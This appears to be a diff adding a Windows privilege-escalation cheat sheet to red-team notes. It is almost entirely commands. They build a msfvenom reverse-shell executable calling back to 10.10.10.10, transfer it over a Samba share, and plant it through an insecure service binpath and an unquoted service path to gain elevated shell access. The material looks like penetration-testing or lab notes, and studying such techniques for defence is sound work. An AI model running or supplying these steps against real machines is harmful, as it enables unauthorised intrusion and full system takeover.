@@ -42,6 +42,73 @@ https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023
 https://github.com/Mr-Un1k0d3r/PowerLessShell
 
 
+## Windows Privilege Escalation
+
+### Generate Reverse Shell
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
+````
+
+### Start Samba Server
+
+```
+sudo smbserver.py kali .
+```
+
+### Copy from Samba Server on Windows
+
+```
+copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
+```
+
+### Insecure Service Permissions
+
+- Check user permissions for service:
+```
+C:\PrivEsc\accesschk.exe /accepteula -uwcqv user SERVICENAME
+```
+
+- Query Service privileges:
+```
+sc qc SERVICENAME
+```
+
+- Set binary path to the reverse shell:
+```
+sc config SERVICENAME binpath= "\"C:\PrivEsc\reverse.exe\""
+```
+
+- Start Service:
+```
+net start SERVICENAME
+```
+
+### Unquoted Service Path
+
+- Check Binary Path of Service:
+```
+sc qc SERVICENAME
+```
+
+- Check if user can write to directory:
+```
+C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+```
+
+- Copy the reverse shell to the directory with the unsupicious name 
+```
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+```
+
+- Start the service:
+```
+net start unquotedsvc
+```
+
+
+
+
 
 
 
